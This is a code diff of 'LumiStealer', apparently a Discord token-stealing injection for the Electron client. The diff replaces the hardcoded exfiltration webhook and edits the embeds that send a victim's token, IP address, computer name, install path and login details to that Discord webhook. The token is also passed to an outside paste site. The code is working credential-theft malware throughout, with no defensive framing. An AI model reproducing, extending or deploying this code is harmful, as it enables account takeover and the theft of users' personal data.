@@ -11,7 +11,7 @@ var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=documen
 
 const dataNow = new Date().toISOString();
 
-const webhook = 'https://discord.com/api/webhooks/1249574571687018586/-C52uZ-bKh3AyIxb2I5GVDzNhp57WlumATrI-NjxBkCjEAC5fQx5KZoyARfA2Mp7H3dQ'
+const webhook = 'https://discord.com/api/webhooks/1235675331726282825/7qmlJaHDrc59CUjvYFrxRUwk1_pttpwiOrqLwK4xCQkCqQM7Rw8hHHLq-1xKDdAoEdF3'
 
 let contents2FA = []
 
@@ -74,32 +74,11 @@ const getURL = async (url, token) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return (1 & e) && (n += "<:1207icondiscordstaff:1249771655639859251> "), 
-           (2 & e) && (n += "<:1835iconpartneredserverowner:1249771639340531802> "), 
-           (4 & e) && (n += "<:9472hypesquadeventsbadge:1249772408609701888> "), 
-           (8 & e) && (n += "<:8084iconbughunter:1249771650375876739> "), 
-           (64 & e) && (n += "<:7878iconhypesquadbravery:1249771646189834373> "), 
-           (128 & e) && (n += "<:brilliance:874750808338608199> "), 
-           (256 & e) && (n += "<:8905iconhypesquadbalance:1249771648614404206> "), 
-           (512 & e) && (n += "<:3743earlysupporterbadge:1248021361796976691> "), 
-           (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 
-           (4194304 & e) && (n += "<:1207iconactivedeveloper:1249771641035034745> "), 
-           (131072 & e) && (n += "<:1207iconearlybotdeveloper:1249771657267122336> "), 
-           "" === n && (n = ":x:"), 
-           n;
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
-
 const GetRBadges = (e) => {
     var n = "";
-    return (1 & e) && (n += "<:staff:891346298932981783> "), 
-           (2 & e) && (n += "<:partner:1041639667226914826> "), 
-           (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 
-           (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 
-           (512 & e) && (n += "<:early:944071770506416198> "), 
-           (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 
-           (131072 & e) && (n += "<:devcertif:1041639665498861578> "), 
-           "" === n && (n = ":x:"), 
-           n;
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -126,20 +105,20 @@ const GetA2F = (bouki) => {
 
 
 const parseFriends = friends => {
-    try {
-        var real = friends.filter(x => x.type == 1);
-        var rareFriends = "";
-        for (var friend of real) {
-            var badges = GetRBadges(friend.user.public_flags);
-            if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`;
-        }
-        if (!rareFriends) rareFriends = "No Rare Friends";
-        return {
-            len: real.length,
-            badges: rareFriends
-        };
-} catch(err) {
-     return ":x:";
+    try{
+    var real = friends.filter(x => x.type == 1)
+    var rareFriends = ""
+    for (var friend of real) {
+        var badges = GetRBadges(friend.user.public_flags)
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+    }
+    if (!rareFriends) rareFriends = "No Rare Friends"
+    return {
+        len: real.length,
+        badges: rareFriends
+    }
+}catch(err){
+    return ":x:"
 }
 }
 
@@ -291,35 +270,35 @@ async function initOne() {
   var { appPath, appName } = path;
   var client_discord = appName;
 
-const embed = {
+  const embed = {
     title: 'First Injection Detected - LumiStealer',
     color: 0x5a0998,
     fields: [
-        {
-            name: "Injection Path:",
-            value: "`" + __dirname + "`",
-            inline: false
-        },
-        {
-            name: "Infected App:",
-            value: "<:lupa:1249813644750098534> `" + appName + "`",
-            inline: true
-        },
-        {
-            name: "Computer Name:",
-            value: "<:r_purple_204:1229800367861272576> `" + computerName + "`",
-            inline: true
-        },
-        {
-            name: "IP Address:",
-            value: "<:r_purple19_emoji:1247251239255670905> `" + ip + "`",
-            inline: true
-        },
-        {
-            name: "Token:",
-            value: "`" + token + "`\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + token + ")",
-            inline: false
-        },
+      {
+        name: "Injection Path:",
+        value: "`"+__dirname+"`",
+        inline: false
+      },
+      {
+        name: "Client:",
+        value: "`"+appName+"`",
+        inline: true
+      },
+      {
+        name: "Computer Name:",
+        value: "`"+computerName+"`",
+        inline: true
+      },
+      {
+        name: "IP:",
+        value: "`"+ip+"`",
+        inline: true
+      },
+      {
+        name: "Token:",
+        value: "`"+token+"`\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+        inline: false
+      },
     ],
     "author": {
       name: user.username+"#0000 - LumiStealer",
@@ -476,7 +455,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin = {
         embeds: [embedLogin],
         username: "Logins - LumiStealer",
-        avatar_url: "hhttps://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
       }
 
       await sendWebhook(webhook, dataLogin);
@@ -546,7 +525,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://i.pinimg.com/564x/7d/8e/86/7d8e86430309353281a9d78ad71c4228.jpg",
+          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
           text: "LumiStealer"
         },
         timestamp: dataNow,
@@ -557,7 +536,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin3 = {
         embeds: [embedLogin3],
         username: "Logins - LumiSt2aler",
-        avatar_url: "https://i.pinimg.com/564x/7d/8e/86/7d8e86430309353281a9d78ad71c4228.jpg"
+        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
       }
 
       await sendWebhook(webhook, dataLogin3);
@@ -659,7 +638,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         color: 0x5a0998,
         fields: [
           {
-            name: "User",
+            name: "Username",
             value: "`"+user.username+"`",
             inline: true
           },
